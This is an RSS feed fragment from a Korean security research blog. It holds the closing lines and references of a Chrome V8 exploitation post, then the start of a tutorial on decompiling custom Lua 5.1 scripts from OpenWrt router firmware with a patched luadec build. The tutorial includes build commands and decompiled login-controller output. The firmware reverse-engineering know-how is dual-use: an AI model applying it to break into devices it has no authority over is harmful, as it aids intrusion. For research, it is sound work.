&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB09C;&#xC774;&#xB3C4;&#xAC00; &#xC62C;&#xB77C;&#xAC14;&#xC744; &#xBFD0; Sandbox&#xB9CC; &#xD0C8;&#xCD9C;&#xD558;&#xBA74;&#x2026;?</p><p><img src="image%2011.jpg" alt="image.jpg"></p><p>&#xB2E4;&#xC74C; &#xC2DC;&#xAC04;&#xC5D0;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xC0DD;&#xAE34; &#xD6C4;&#xC758; &#xB80C;&#xB354;&#xB7EC; RCE&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xADF8;&#xB7FC; &#xB610; &#xBD10;&#xC694; &#x1F64C;</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p><a href="https://v8.dev/blog/sandbox">https://v8.dev/blog/sandbox</a></p><p><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/</a></p><p><a href="https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf">https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf</a></p><p><a href="https://m.blog.naver.com/funraon/223669595583">https://m.blog.naver.com/funraon/223669595583</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2018-17463/">CVE-2018-17463</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-Sandbox/">Heap Sandbox</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Custom Lua Script  Decompile (KR)</title>
      <link>https://hackyboiz.github.io/2025/10/04/newp1ayer48/lua/kr/</link>
      <guid>https://hackyboiz.github.io/2025/10/04/newp1ayer48/lua/kr/</guid>
      <pubDate>Sat, 04 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC5B8;&#xC5B4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; Lua Script&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xAE30;&#xAE30;&#xC640; &#xC5C5;&#xCCB4;&#xB4E4;&#xC740; &#xC774; Lua Script&#xB97C; Custom&#xC73C;&#xB85C; &#xBCC0;&#xD615;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xCEF4;&#xD30C;&#xC77C; &#xB41C; Lua Script&#xB97C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C;&#x2026; &#xBD84;&#xC11D;&#xC744; &#xC704;&#xD574; &#xC9C1;&#xC811; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xB3C4;&#xAD6C;&#xB97C; &#xAC1C;&#xB7C9;&#xD558;&#xACE0; &#xD328;&#xCE58; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xCD5C;&#xC885; &#xD328;&#xCE58; &#xB41C; &#xB3C4;&#xAD6C;&#xC758; Github&#xC744; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xD558;&#xC154;&#xB3C4; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>Lua Script&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xBD80;&#xD130;, &#xC774;&#xB807;&#xAC8C; Custom&#xB41C; Lua Script&#xB97C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-Lua-Script"><a href="#1-Lua-Script" class="headerlink" title="1. Lua Script"></a>1. Lua Script</h2><p><img src="image02.jpg" alt="image02.jpg"></p><p>Lua Script&#xB294; &#xBE0C;&#xB77C;&#xC9C8; &#xB9AC;&#xC6B0;&#xB370;&#xC790;&#xB124;&#xC774;&#xB8E8;&#xC758; &#xAD50;&#xD669;&#xCCAD; &#xAC00;&#xD1A8;&#xB9AD; &#xB300;&#xD559;&#xAD50;(PUC-Rio) &#xD300;&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5B8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;!(&#xC2E0;&#xC758; &#xC5B8;&#xC5B4;..?) &#xC791;&#xACE0; &#xAC00;&#xBCCD;&#xB2E4;&#xB294; &#xD2B9;&#xC9D5;&#xACFC; &#xD568;&#xAED8; &#xC2DC;&#xC2A4;&#xD15C; &#xC81C;&#xC5B4;&#xB3C4; &#xAC00;&#xB2A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC2DC;&#xC2A4;&#xD15C;&#xACFC; &#xAC8C;&#xC784; &#xAC1C;&#xBC1C;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xAC00;&#xBCCD;&#xACE0; &#xAC15;&#xB825;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5B8;&#xC5B4; &#xAE30;&#xB2A5; &#xB355;&#xBD84;&#xC5D0;, Wireshark &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xAC1C;&#xBC1C;&#xC774;&#xB098; Custom Dissectors &#xAC19;&#xC774; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xB808;&#xBCA8;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xB3C4;&#xAD6C;&#xB85C;&#xC368;&#xB3C4; &#xC720;&#xC6A9;&#xD55C; &#xBAA8;&#xC2B5;&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. <a href="https://www.lua.org/">&#xACF5;&#xC2DD; &#xC0AC;&#xC774;&#xD2B8;</a>&#xC5D0; &#xC124;&#xCE58; &#xBC0F; &#xAC01; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC640; &#xD568;&#xC218;&#xC758; &#xC0AC;&#xC6A9;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBAA8;&#xB450; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Lua&#xB294; 5.1 &#xBC84;&#xC804;&#xBD80;&#xD130; &#xD604;&#xC7AC; 5.4 &#xBC84;&#xC804;&#xAE4C;&#xC9C0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, C/C+&#xACFC; &#xC5F0;&#xB3D9; &#xBC0F; &#xD655;&#xC7A5;&#xC131;&#xC774; &#xB9E4;&#xC6B0; &#xB6F0;&#xC5B4;&#xB098;&#xB2E4;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. C/C++&#xCC98;&#xB7FC; Lua&#xB3C4; &#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xBE4C;&#xB4DC; &#xD560; &#xC218; &#xC788;&#xACE0;, &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xAE30;&#xAE30;&#xB098; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCEF4;&#xD30C;&#xC77C; &#xB41C; Lua &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xC6B0; .lua&#xC774;&#xACE0; &#xCEF4;&#xD30C;&#xC77C; &#xB41C; &#xD30C;&#xC77C;&#xC740; .luac &#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; .lua &#xD655;&#xC7A5;&#xC790;&#xB85C;&#xB3C4; &#xCEF4;&#xD30C;&#xC77C; &#xB41C; &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBBC0;&#xB85C; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC81C;&#xC77C; &#xD655;&#xC2E4;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBCF4;&#xC548; &#xAD00;&#xC810;&#xC5D0;&#xC11C; Lua&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xC8FC;&#xC694; &#xBCA1;&#xD130;&#xB85C; &#xC791;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>os.execute()</code> &#xAC19;&#xC740; &#xD568;&#xC218;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, Command Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC8FC;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; Stack&#xACFC; Heap &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C;&#xB3C4; Memory Corruption&#xACFC; Overflow &#xCDE8;&#xC57D;&#xC810;&#xB3C4; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; <a href="https://www.cvedetails.com/product/28436/LUA-LUA.html?vendor_id=13641">CVE</a>&#xAC00; &#xC81C;&#xBCF4; &#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-1-openwrt&#xC640;-Luci"><a href="#1-1-openwrt&#xC640;-Luci" class="headerlink" title="1.1. openwrt&#xC640; Luci"></a>1.1. openwrt&#xC640; Luci</h3><p><img src="image03.png" alt="image03.png"></p><p>openwrt&#xB294; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xAE30;&#xAE30; &#xC911; &#xACF5;&#xC720;&#xAE30;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xB9AC;&#xB205;&#xC2A4; &#xBC30;&#xD3EC;&#xD310; &#xC785;&#xB2C8;&#xB2E4;. <a href="https://openwrt.org/">&#xACF5;&#xC2DD; &#xC0AC;&#xC774;&#xD2B8;</a>&#xB97C; &#xD1B5;&#xD574; &#xBC30;&#xD3EC;&#xD310;&#xC744; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xACE0;, openwrt&#xB97C; &#xD1B5;&#xD574; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xACF5;&#xC720;&#xAE30; &#xC815;&#xBCF4;&#xAC00; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC0C1;&#xC138;&#xD788; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9; &#xBC0F; &#xAD00;&#xB828; &#xC9C0;&#xC2DD;&#xC744; &#xC5BB;&#xAE30;&#xC5D0;&#xB3C4; &#xC0C1;&#xB2F9;&#xD788; &#xC88B;&#xC740; &#xC0AC;&#xC774;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;! &#xADF8;&#xB9AC;&#xACE0; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB2E4;&#xAC00; &#xACF5;&#xC720;&#xAE30;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB2E4; &#xBCF4;&#xBA74;, openwrt &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xB41C; &#xACF5;&#xC720;&#xAE30;&#xC640; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC790;&#xC8FC; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>openwrt&#xB85C; &#xAC1C;&#xBC1C;&#xB41C; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC640; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD3B8;&#xB9AC;&#xD558;&#xAC8C; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAC1C;&#xB7C9;&#xB41C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Luci&#xAC00; &#xB0B4;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. Lua 5.1 &#xBC84;&#xC804;&#xC744; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBD84;&#xC11D;&#xD558;&#xB294; Lua &#xD30C;&#xC77C;&#xC740; &#xC8FC;&#xB85C; 5.1 &#xBC84;&#xC804;&#xC778; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-Lua-Decompiler-luadec"><a href="#2-Lua-Decompiler-luadec" class="headerlink" title="2. Lua Decompiler: luadec"></a>2. Lua Decompiler: luadec</h2><p><img src="image04.jpg" alt="image04.jpg"></p><p>&#xCEF4;&#xD30C;&#xC77C; &#xB41C; Lua &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xC6B0; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B4; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; Lua &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xBCF8; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; C &#xAE30;&#xBC18;&#xC758; luadec&#xACFC; Java &#xAE30;&#xBC18;&#xC5D0; unluac&#xC774; &#xB300;&#xD45C;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. unluac&#xC740; 5.2 &#xC774;&#xC0C1;&#xC758; &#xBC84;&#xC804;&#xBD80;&#xD130; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xC131;&#xB2A5;&#xC774; &#xC88B;&#xB2E4;&#xB294; &#xD3C9;&#xAC00;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xC5F0;&#xAD6C; &#xAE00;&#xC5D0;&#xC11C;&#xB294; 5.1 &#xBC84;&#xC804;&#xC758; Lua &#xD30C;&#xC77C;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, luadec&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC21C;&#xC815; luadec&#xC740; openwrt &#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xAE30;&#xC5D0;, &#xAD00;&#xB828; &#xD328;&#xCE58;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xC57C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC774; &#xC218;&#xC6D4;&#xD558;&#xAC8C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. luadec &#xC124;&#xCE58;&#xC640; openwrt &#xD328;&#xCE58;&#xB97C; &#xC801;&#xC6A9;&#xC740; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC9C4;&#xD589;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">sudo apt-get updatesudo apt-get install libncurses-dev libreadline-devgit <span class="hljs-built_in">clone</span> https://github.com/viruscamp/luadec<span class="hljs-built_in">cd</span> luadecgit submodule update --init lua-5.1ref=masterpatch_dir=patches.<span class="hljs-variable">$ref</span>mkdir <span class="hljs-variable">$patch_dir</span> &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-variable">$patch_dir</span>patchs=$(curl -sSL -H <span class="hljs-string">&apos;Accept: application/vnd.github.v3+json&apos;</span> <span class="hljs-string">&apos;https://api.github.com/repos/openwrt/openwrt/contents/package/utils/lua/patches?ref=&apos;</span><span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span> |grep -oP <span class="hljs-string">&apos;name\&quot;\s*:\s*\&quot;.*\.patch&apos;</span> |grep -oP <span class="hljs-string">&apos;\d+.*\.patch&apos;</span>)<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-variable">$patchs</span>;<span class="hljs-keyword">do</span>  wget <span class="hljs-string">&apos;https://raw.githubusercontent.com/openwrt/openwrt/master/package/utils/lua/patches/&apos;</span><span class="hljs-variable">${p}</span>  -O <span class="hljs-variable">$p</span>;<span class="hljs-keyword">done</span><span class="hljs-built_in">cd</span> ../lua-5.1<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ../<span class="hljs-variable">${patch_dir}</span>/*.patch; <span class="hljs-keyword">do</span> patch -p1 &lt;<span class="hljs-variable">$i</span> ; <span class="hljs-keyword">done</span>MAKEFILE=<span class="hljs-string">&quot;src/Makefile&quot;</span>cp <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>.bak&quot;</span>sed -i <span class="hljs-string">&apos;/# USE_READLINE=1/a PKG_VERSION = 5.1.5&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span>sed -i <span class="hljs-string">&apos;s/CFLAGS= -O2 -Wall $(MYCFLAGS)/CFLAGS= -fPIC -O2 -Wall $(MYCFLAGS)/&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span>sed -i <span class="hljs-string">&apos;s/$(CC) -o $@ -L\. -llua $(MYLDFLAGS) $(LUA_O) $(LIBS)/$(CC) -o $@ $(LUA_O) $(MYLDFLAGS) -L. -llua $(LIBS)/&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span>sed -i <span class="hljs-string">&apos;s/$(CC) -o $@ -L\. -llua $(MYLDFLAGS) $(LUAC_O) $(LIBS)/$(CC) -o $@ $(LUAC_O) $(MYLDFLAGS) -L. -llua $(LIBS)/&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span><span class="hljs-built_in">cd</span> srcmake linux<span class="hljs-built_in">export</span> LD_LIBRARY_PATH=`<span class="hljs-built_in">pwd</span>`/src/<span class="hljs-built_in">cd</span> ../../luadecmake LUAVER=5.1sudo cp luadec /usr/<span class="hljs-built_in">local</span>/bin/</code></pre><p>&#xC124;&#xCE58; &#xBC0F; &#xD328;&#xCE58; &#xC9C4;&#xD589; &#xD6C4; &#xC608;&#xC81C; &#xD30C;&#xC77C;&#xC744; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xBA74; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xACB0;&#xACFC;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">./luadec ./luaFile.lua</code></pre><pre><code class="hljs lua"><span class="hljs-comment">-- params : ...</span><span class="hljs-comment">-- function num : 0</span><span class="hljs-built_in">module</span>(<span class="hljs-string">&quot;luci.controller.login&quot;</span>, <span class="hljs-built_in">package</span>.<span class="hljs-built_in">seeall</span>)<span class="hljs-keyword">local</span> l_0_0 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.controller&quot;</span>)<span class="hljs-keyword">local</span> l_0_1 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio&quot;</span>)<span class="hljs-keyword">local</span> l_0_2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio.fs&quot;</span>)<span class="hljs-keyword">local</span> l_0_3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.sys&quot;</span>)<span class="hljs-keyword">local</span> l_0_4 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.util&quot;</span>)<span class="hljs-keyword">local</span> l_0_5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.error&quot;</span>)<span class="hljs-keyword">local</span> l_0_6 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.log&quot;</span>)<span class="hljs-keyword">local</span> l_0_7 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.debug&quot;</span>)<span class="hljs-keyword">local</span> l_0_8 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.json&quot;</span>)<span class="hljs-keyword">local</span> l_0_9 = (<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.datatypes&quot;</span>))<span class="hljs-keyword">local</span> l_0_10 = <span class="hljs-literal">nil</span><span class="hljs-keyword">local</span> l_0_11 = <span class="hljs-string">&quot;/var/run/luci-attempts.lock&quot;</span><span class="hljs-keyword">local</span> l_0_12 = <span class="hljs-string">&quot;/tmp/luci-attempts&quot;</span><span class="hljs-keyword">local</span> l_0_13 = <span class="hljs-string">&quot;/tmp/TIME_STAMP&quot;</span><span class="hljs-keyword">local</span> l_0_14 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_15 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_16 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_17 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_18 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_19 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_20 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_21 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_22 = <span class="hljs-string">&quot;users&quot;</span><span class="hljs-keyword">local</span> l_0_23 = <span class="hljs-string">&quot;02008001&quot;</span><span class="hljs-keyword">local</span> l_0_24 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_25 = <span class="hljs-string">&quot;02108001&quot;</span><span class="hljs-keyword">local</span> l_0_31 = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(l_1_0)</span></span>...</code></pre><p>&#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xACB0;&#xACFC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; &#xD574;&#xC11D;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xBCC0;&#xC218;&#xB098; &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xD574;&#xC11D;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xC5B4;&#xB824;&#xC6C0;&#xC744; &#xB290;&#xB084; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-Decompiling-custom-lua-files-with-luadec"><a href="#3-Decompiling-custom-lua-files-with-luadec" class="headerlink" title="3. Decompiling custom lua files with luadec"></a>3. Decompiling custom lua files with luadec</h2><p>&#xC608;&#xC81C; &#xD30C;&#xC77C;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; luadec &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xC2DC;, &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xC5D0;&#xB7EC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC815;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778; &#xD14C;&#xC774;&#xBE14; &#xCD08;&#xAE30;&#xD654;<ul><li><code>SetList fails</code></li></ul></li><li>&#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC0C1;&#xC218; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;<ul><li><code>Unknown_Type_Error</code></li></ul></li><li>&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBD84;&#xC11D; &#xC2E4;&#xD328;<ul><li><code>cannot find blockend</code></li></ul></li></ul><p>&#xC774; &#xC911; luadec&#xC5D0;&#xC11C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC758; &#xD575;&#xC2EC; &#xAE30;&#xB2A5;&#xC744; 